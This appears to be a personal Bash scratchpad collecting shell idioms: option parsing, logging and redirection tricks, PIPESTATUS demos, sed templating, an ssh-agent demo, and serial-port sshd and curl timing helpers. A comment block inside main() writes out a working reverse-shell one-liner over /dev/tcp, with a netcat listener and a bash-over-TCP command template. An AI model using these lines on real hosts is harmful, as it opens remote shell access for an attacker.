#!/usr/bin/env bash
readonly DIRNAME="$(readlink -f "$(dirname "$0")")"
readonly SCRIPTNAME=${0##*/}
if [[ ${DEBUG-} =~ ^1|yes|true$ ]]; then
    exec 5> "${DIRNAME}/$(date '+%Y%m%d%H%M%S').${SCRIPTNAME}.debug.log"
    BASH_XTRACEFD="5"
    export PS4='[\D{%FT%TZ}] ${BASH_SOURCE}:${LINENO}: ${FUNCNAME[0]:+${FUNCNAME[0]}(): }'
    set -o xtrace
fi
VERSION+=("cc3f945[2023-01-12T15:02:10+08:00]:try.sh")
[ -e ${DIRNAME}/functions.sh ] && . ${DIRNAME}/functions.sh || true
##################################################
cleanup() {
    echo "EXIT!!!"
}

trap cleanup EXIT
trap "exit 1" INT TERM  # makes the EXIT trap effective even when killed
##################################################
dummy() {
    echo "MY DUMMY"
    source 'trap.sh'
    echo "doing something wrong now .."
    echo "$foo"
}

usage() {
    [ "$#" != 0 ] && echo "$*"
    cat <<EOF
${SCRIPTNAME} 
        -q|--quiet
        -l|--log <int> log level
        -V|--version
        -d|--dryrun dryrun
        -h|--help help
EOF
    exit 1
}

#    echo='echo'
#    echo='printf %s\n'
#    echo_func () {
#        cat <<EOT
#$*
#EOT
#    }
#    echo='echo_func'

exec 2> >(tee "error_log_$(date -Iseconds).txt")
board=$1; shift || (echo "ERROR: Board must be specified"; exit 1;)
uboot=$1; shift || (echo "ERROR: u-boot.bin must be specified"; exit 1;)

test_lowercase()
{
    # Grab input.
    declare input=${1:-$(</dev/stdin)};

    # Use that input to do anything.
    echo "$input" | tr '[:upper:]' '[:lower:]'
}

echo "$(test_lowercase 'HELLO xx')"
echo "HELLO there, FRIEND!" | test_lowercase

cat <<EOF | sudo tee /dev/null
    'append STDOUT and STDERR'            : ' &>> <CURSOR>',
    'close input from file descr n'       : ' <CURSOR><&- ',
    'close output from file descr n'      : ' <CURSOR>>&- ',
    'close STDIN'                         : ' <&- <CURSOR>',
    'close STDOUT'                        : ' >&- <CURSOR>',
    'direct file descr n to file, append' : ' <CURSOR>>> ',
    'direct file descr n to file'         : ' <CURSOR>> ',
    'direct STDERR to STDOUT'             : ' 2>&1<CURSOR>',
    'direct STDOUT and STDERR to file'    : ' &> <CURSOR>',
    'direct STDOUT to file, append'       : ' >> <CURSOR>',
    'direct STDOUT to file'               : ' > <CURSOR>',
    'direct STDOUT to STDERR'             : ' >&2<CURSOR>',
    'duplicate STDIN from file descr n'   : ' <CURSOR><& ',
    'duplicate STDOUT to file descr n'    : ' <CURSOR>>& ',
    'take file descr n from file'         : ' <CURSOR>< ',
    'take STDIN from file'                : ' < <CURSOR>',
EOF
# cat >>'EOF'
# {
#     "partitions": {
#         "boot_size": "67108864"
#     },
#     "debian": {
#         "release": "wheezy",
#         "packages": [ "openssh-server1", "openssh-server2", "openssh-server3" ]
#     }
# }
# EOF

# while read package ; do
#     echo ${package}
# done < <(json_config "debian.packages[]")



# Level, Level Name, Level Format, Before Log Entry, After Log Entry
KMAP=(
  'key1'  'DEBUG   ' "<D> " "\e[1;34m"    "\e[0m"
  'key2'  'INFO    ' "<I> " "\e[1;32m"    "\e[0m"
  'key3'  'WARNING ' "<W> " "\e[1;33m"    "\e[0m"
  'key4'  'ERROR   ' "<E> " "\e[1;31m"    "\e[0m"
  'key5'  'CRITICAL' "<C> " "\e[1;37;41m" "\e[0m"
)
ITEM_STR=
ITEM_FMT=
ITEM_PRE=
ITEM_END=

fill_predefine() {
  local key="${1}"
  local i
  for ((i=0; i<${#KMAP[@]}; i+=5)); do
    if [[ "${key}" == "${KMAP[i]}" ]]; then
      ITEM_STR="${KMAP[i+1]}"
      ITEM_FMT="${KMAP[i+2]}"
      ITEM_PRE="${KMAP[i+3]}"
      ITEM_END="${KMAP[i+4]}"
      return 0
    fi
  done
  return 1
}
# ==================================================
# # Redirect ALL output/error automatically to a file 
# # AND print to console too
# LOG_OUTPUT=output_error.log
#  
# exec 1> >(tee -i ${LOG_OUTPUT}) 2>&1
#  
# ==================================================
# # *ALL* redirected to the log files: NO console output at all
# LOG_OUTPUT=output.log
#  
# exec 1>>${LOG_OUTPUT} 2>&1
#  
# ==================================================
# # All redirected to 2 different log files
# LOG_OUTPUT=etup_output.log
# LOG_ERROR=setup_error.log
#  
# exec 3>&1 1>>${LOG_OUTPUT}
# exec 2>>${LOG_ERROR}
#  
# # use 'P "my message"' instead of echo
# P () {
# # Print on console AND file
# echo -e "\n$1" | tee /dev/fd/3
#  
# # Print ONLY on console
# #echo -e "\n$1" 1>&3
# }
#  
# ==================================================
# # ALL stdout and stderr to $LOG_OUTPUT
# # Also stderr to $LOG_ERROR (for extra checks)
# # P function to print to the console AND logged into $LOG_OUTPUT
# LOG_OUTPUT=output.log
# LOG_ERROR=error.log
#  
# exec 3>&1 1>>${LOG_OUTPUT}
# exec 2> >(tee -i ${LOG_ERROR}) >> ${LOG_OUTPUT}
#  
# # use 'P "my message"' instead of echo
# P () {
# # Print on console AND file
# echo -e "$1" | tee /dev/fd/3
# # Print ONLY on console
# #echo -e "\n$1" 1>&3
# }
#  
# # use 'P "my message"' instead of echo to print in BLUE
# P () {
# BLUE='\033[1;34m'
# NC='\033[0m' # No Color
# echo -e "\n${BLUE}${1}${NC}" | tee /dev/fd/3
# }



# if tput setaf 1 &> /dev/null; then
#     tput sgr0
#     if [[ $(tput colors) -ge 256 ]] 2>/dev/null; then
#         BLUE=$(tput setaf 4)
#         MAGENTA=$(tput setaf 9)
#         ORANGE=$(tput setaf 172)
#         GREEN=$(tput setaf 70)
#         PURPLE=$(tput setaf 141)
#     else
#         BLUE=$(tput setaf 4)
#         MAGENTA=$(tput setaf 5)
#         ORANGE=$(tput setaf 3)
#         GREEN=$(tput setaf 2)
#         PURPLE=$(tput setaf 1)
#     fi
#     BOLD=$(tput bold)
#     RESET=$(tput sgr0)
# else
#     BLUE="\033[1;34m"
#     MAGENTA="\033[1;31m"
#     ORANGE="\033[1;33m"
#     GREEN="\033[1;32m"
#     PURPLE="\033[1;35m"
#     BOLD=""
#     RESET="\033[m"
# fi

# unit tests for is_ipv4
test_is_ipv4(){
    tests=" \
        4.2.2.2          0 \
        192.168.1.1      0 \
        0.0.0.0          0 \
        255.255.255.255  0 \
        192.168.0.1      0 \
        a.b.c.d          1 \
        255.255.255.256  1 \
        192.168.0        1 \
        1234.123.123.123 1 \
    "
    set $tests
    status=0
    while [ "$#" != 0 ]; do
        printf "."
        is_ipv4 $1
        res=$?
        if [ "$res" != "$2" ]; then
            echo "is_ipv4 $1: expected $2, got $res"
            status=1
        fi
        shift 2
    done
    return $status
}
ssh_quick_demo() {
eval $(timeout 3h ssh-agent)
ssh-add ~/pri.key
# ssh .........
ssh-agent -k
}


# ssh user@host << EOF
#     $(typeset -f myfn)
#     myfn
# EOF
# DESTDIR="$(mktemp -d "${TMPDIR:-/var/tmp}/mkinitramfs_XXXXXX")" || exit 1
# chmod 755 "${DESTDIR}"
# __TMPCPIOGZ="$(mktemp "${TMPDIR:-/var/tmp}/mkinitramfs-OL_XXXXXX")" || exit 1

main() {
    log_file=log.txt
    # redirect stdout and stderr to $log_file and print
    exec > >(tee -ia $log_file)
    exec 2> >(tee -ia $log_file >&2)
    exec {FD}>mylog.txt
    echo "hello" >&${FD}
    exec {FD}>&-

    local opt_short="u:n:"
    local opt_long="uuid:,name:,"
    opt_short+="ql:dVh"
    opt_long+="quiet,log:,dryrun,version,help"
    __ARGS=$(getopt -n "${SCRIPTNAME}" -o ${opt_short} -l ${opt_long} -- "$@") || usage
    eval set -- "${__ARGS}"
    while true; do
        case "$1" in
            -u | --uuid)    shift; uuid=${1}; shift;;
            -n | --name)    shift; name=${1}; shift;;
            ########################################
            -q | --quiet)   shift; QUIET=1;;
            -l | --log)     shift; set_loglevel ${1}; shift;;
            -d | --dryrun)  shift; DRYRUN=1;;
            -V | --version) shift; for _v in "${VERSION[@]}"; do echo "$_v"; done; exit 0;;
            -h | --help)    shift; usage;;
            --)             shift; break;;
            *)              usage "Unexpected option: $1";;
        esac
    done
    echo "random=$(shuf -i 42002-42254 -n 1)"
# ./xtrace.sh ./try.sh 
__trace_ON__
    list_func
__trace_OFF__
    dummy
    TEST=/etc/apt/source.list
    escaped_testx="$(sed -e 's/[\/&]/\\&/g' <<< "$TEST"; echo x)"
    escaped_test="${escaped_testx%x}"
    echo $escaped_test

    exit_msg "$0 --start/--clean filename\n"
    echo "MAIN!!!"
    # echo > aa.txt
    # ${EDITOR:-${VISUAL:-vi}}  aa.txt
    netstat -tulpn | grep nginx
    echo "${PIPESTATUS[@]}"
    true | true
    echo "The exit status of first command ${PIPESTATUS[0]}, and the second command ${PIPESTATUS[1]}"
    true | false
    echo "The exit status of first command ${PIPESTATUS[0]}, and the second command ${PIPESTATUS[1]}"
    false | false | true
    echo "The exit status of first command ${PIPESTATUS[0]}, second command ${PIPESTATUS[1]}, and third command ${PIPESTATUS[2]}"

    echo "start: get all pipe exit code"
    false | true | (exit 50)
    echo ${PIPESTATUS[@]}
    echo "end: get all pipe exit code"

    read -r SED_EXPR <<-EOF
s#^port .\+#port ${REDIS_PORT}#; \
s#^logfile .\+#logfile ${REDIS_LOG_FILE}#; \
s#^dir .\+#dir ${REDIS_DATA_DIR}#; \
s#^pidfile .\+#pidfile ${PIDFILE}#; \
s#^daemonize no#daemonize yes#;
EOF
    sed "$SED_EXPR" CONFIG >> tmp.file
# SED_E=(
#     -E                           # ERE (alias to -r in GNU sed)
#     -e 's/read|sleep|cat/:/g'    # NOP
#     -e 's/! :/:/'                # ! read -> ! : -> :
#     -e 's/tput cols/echo 80/'    # 80x24
#     -e 's/tput lines/echo 24/'
# )
# SED_E+=(-e "$ a some text") #append at end
# SED_E+=(-e "/^key/d") #delete
# sed "${SED_E[@]}" tmpfile

# virsh dumpxml test_domain > a.xml
# xmlstarlet el a.xml
# xmlstarlet el -a a.xml
# xmlstarlet el -v a.xml
# xmlstarlet ed -u "domain/currentMemory[@unit='KiB']" -v 1111 a.xml
# cat a.xml | xmlstarlet ed -u "domain/currentMemory[@unit='KiB']" -v 1111
    # reverse-shell
    # local<192.168.168.A>  run: nc -lp9999
    # remote<192.168.168.B> run: bash -i &> /dev/tcp/192.168.168.A/9999 0>&1
    # REMOTE_COMMAND="/bin/bash -c /bin/bash</dev/tcp/${ip}/${port}"

    echo ssh -p port user1@target -J user2@bridge:port
    echo scp -o \"ProxyJump user1@Proxy\" File User@Destination:Path
    return 0
}

# nmon -f -F ./a.nmon -s 10 -c 10

##
#  Usage: ./testprog fetch -c <cert_file> -k <key_file> [-v <version>]
#    -y        - answers "yes" to all questions
##
usage22() {
    sed -ne '/^#\s*Usage/,/^##\s*$/p' < $0 | sed 's/#//g'
}

sshd_sos() {
    setsid sh -c '
    tty=/dev/ttyS0
    grace_time=5
    echo "Starting SSHD over serial on $tty.."
    stty <$tty
    while true
    do
        sshd -i -g $grace_time <$tty >$tty
    done
    ' &
    sleep 1
    exit 0
}
curl -s --connect-timeout 5 \
    -w "time_namelookup: %{time_namelookup}\ntime_connect: %{time_connect}\ntime_appconnect: %{time_appconnect}\ntime_pretransfer: %{time_pretransfer}\ntime_redirect: %{time_redirect}\ntime_starttransfer: %{time_starttransfer}\ntime_total: %{time_total}\n" \
    -o /dev/null \
    https://xxx/
main "$@"
